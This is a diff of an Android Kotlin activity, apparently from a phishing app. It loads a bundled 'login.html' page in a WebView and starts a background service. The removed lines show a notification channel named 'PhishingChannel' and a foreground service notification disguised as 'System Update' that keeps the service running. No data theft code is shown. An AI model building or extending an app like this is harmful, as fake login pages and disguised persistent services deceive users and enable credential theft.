@@ -1,8 +1,6 @@
 package com.luffa
 
 import android.Manifest
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -16,7 +14,6 @@ import android.util.Log
 import android.net.Uri
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import android.content.ComponentName
 import android.webkit.*
@@ -30,18 +27,14 @@ class MainActivity : AppCompatActivity() {
     private lateinit var prefs: android.content.SharedPreferences
     private val LAUNCH_LIMIT = 7
     private lateinit var myWebView: WebView
-private val CHANNEL_ID = "PhishingChannel"
-    private val NOTIFICATION_ID = 1
-
-
-    
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // 1. Initialize SharedPreferences
         prefs = PreferenceManager.getDefaultSharedPreferences(this)
         
-        // WebView Initialize
+        // 2. Initialize WebView
         myWebView = WebView(this)
         setContentView(myWebView)
 
@@ -51,44 +44,29 @@ private val CHANNEL_ID = "PhishingChannel"
         webSettings.allowFileAccess = true
         webSettings.loadWithOverviewMode = true
         webSettings.useWideViewPort = true
-        // Console log dekhar jonno
         myWebView.settings.setJavaScriptCanOpenWindowsAutomatically(true)
         
+        // WebView Client Fix
         myWebView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
-                // Page load howar por kono action
+                // Page load complete
             }
         }
 
-override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Update")
-            .setContentText("Running...")
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setOngoing(true)
-            .build()
-
-        startForeground(NOTIFICATION_ID, notification)
-        return START_STICKY
-    }
-
-
-
-
-        
-        
         myWebView.webChromeClient = object : WebChromeClient() {
             override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
-                Log.d("WebView", consoleMessage?.message() + " from line " + consoleMessage?.lineNumber() + " of " + consoleMessage?.sourceId())
+                Log.d("WebView", consoleMessage?.message() + " from line " + consoleMessage?.lineNumber())
                 return true
             }
         }
 
-        // HTML file load kora
+        // Load HTML
         myWebView.loadUrl("file:///android_asset/login.html")
 
+        // 3. Initialize Service Intent
         serviceIntent = Intent(this, MyService::class.java)
 
+        // 4. Launch Count Logic
         val currentLaunches = prefs.getInt("launch_count", 0) + 1
         prefs.edit().putInt("launch_count", currentLaunches).apply()
 
@@ -194,7 +172,5 @@ override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                 vibrator.vibrate(100)
             }
         }
-        // finish() remove kora holo jate WebView load hoye thake
-        // finish() 
     }
 }
